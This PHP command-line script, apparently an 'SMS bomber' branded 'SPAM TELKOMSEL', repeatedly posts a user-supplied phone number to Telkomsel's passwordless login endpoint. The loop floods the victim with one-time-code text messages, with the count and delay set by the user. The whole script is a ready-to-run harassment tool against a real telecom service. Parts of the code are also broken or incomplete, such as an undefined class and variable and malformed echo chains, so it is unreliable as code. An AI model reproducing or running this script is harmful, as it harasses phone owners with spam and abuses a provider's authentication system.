<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
menu:
system($bersih);
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
$init = new Bom();
echo $green."
____  ____   _    __  __
/ ___||  _ \ / \  |  \/  |
\___ \| |_) / _ \ | |\/| |
 ___) |  __/ ___ \| |  | |
|____/|_| /_/   \_\_|  |_|

 _____ _____ _     _  _____  __  __ ____  _____ _
|_   _| ____| |   | |/ / _ \|  \/  / ___|| ____| |
  | | |  _| | |   | ' / | | | |\/| \___ \|  _| | |
  | | | |___| |___| . \ |_| | |  | |___) | |___| |___
  |_| |_____|_____|_|\_\___/|_|  |_|____/|_____|_____|\n".$yellow.
"Tools Inside Heartz";
echo $blue."
[×•×] Author   : Aditia Alfiansyah
[×•×] WhatsApp : +1(313)2617183
[×•×] github   : github.com/Aditia18\n";
echo "";
echo $red.
echo "<!>Nomor? (Cth : 628xxxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo $green.
echo "<!>Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-99999 (ex:1)\nInput : ";
$jeda = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>
